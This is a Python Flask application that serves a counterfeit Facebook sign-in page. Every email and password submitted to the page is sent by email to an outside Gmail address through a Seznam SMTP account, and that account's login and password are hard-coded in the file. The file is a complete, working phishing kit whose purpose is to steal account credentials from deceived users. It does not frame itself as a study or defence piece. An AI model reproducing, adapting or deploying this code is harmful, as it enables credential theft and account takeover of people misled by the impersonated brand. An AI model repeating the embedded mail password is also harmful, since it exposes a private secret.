from flask import Flask, request, render_template_string
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

def send_email(to_email, subject, body):
    sender_email = "info@infopeklo.cz"  # Your Seznam.cz email
    sender_password = "Polik789"  # Your Seznam.cz email password
    smtp_server = "smtp.seznam.cz"
    smtp_port = 587

    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEText(body, "plain"))

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure connection
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message.as_string())
        server.quit()
    except Exception as e:
        print(f"Error sending email: {e}")

# HTML for the login form
login_form_html = """
<!DOCTYPE html>
<html>
<head>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      color: #1d2129;
    }
    .login-container {
      width: 350px;
      background-color: white;
      box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.20);
      border-radius: 5px;
      padding: 10px 20px;
    }
    #logo {
      display: block;
      margin: 0 auto;
      margin-bottom: 20px;
    }
    h1 {
      font-size: 28px;
      font-weight: normal;
      margin-bottom: 10px;
      text-align: center;
    }
    h2 {
      font-size: 16px;
      font-weight: normal;
      color: #606770;
      margin-bottom: 20px;
      text-align: center;
    }
    input[type=text], input[type=password] {
      width: 100%;
      padding: 15px;
      margin: 5px 0 10px 0;
      display: inline-block;
      border: 1px solid #ccc;
      box-sizing: border-box;
      border-radius: 5px;
    }
    button {
      background-color: #4267B2;
      color: white;
      padding: 14px 20px;
      margin: 8px 0;
      border: none;
      cursor: pointer;
      width: 100%;
      border-radius: 5px;
    }
    button:hover {
      opacity: 0.8;
    }
  </style>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
</head>
<body>
  <div class="login-container">
    <svg id="logo" viewBox="0 0 24 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
      <g>
        <path fill="#1877F2" d="M22 2H2C.9 2 0 2.9 0 4v16c0 1.1.9 2 2 2h9v-7h-3V11h3V9c0-2.8 2.2-5 5-5h3v3h-3c-1.1 0-2 .9-2 2v2h5l-1 3h-4v7h6c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"></path>
      </g>
    </svg>
    <form action="/login" method="POST">
      <h1>Sign in</h1>
      <h2>Use your Facebook Account</h2>
      <label for="email"><b>Email</b></label>
      <input type="text" placeholder="Enter Email" name="email" required>
      <label for="password"><b>Password</b></label>
      <input type="password" placeholder="Enter Password" name="password" required>
      <button type="submit">Sign in</button>
    </form>
  </div>
</body>
</html>
"""

# Route for displaying the login form
@app.route('/')
def login_form():
    return render_template_string(login_form_html)

# Route for handling form submission and sending email
@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']
    
    # Send credentials via email
    subject = "Login Credentials"
    body = f"Email: {email}\nPassword: {password}"
    recipient_email = "alfikeita@gmail.com"  # Change this to your email
    
    send_email(recipient_email, subject, body)
    
    return "Credentials received and sent via email!"

if __name__ == '__main__':
    app.run(debug=True)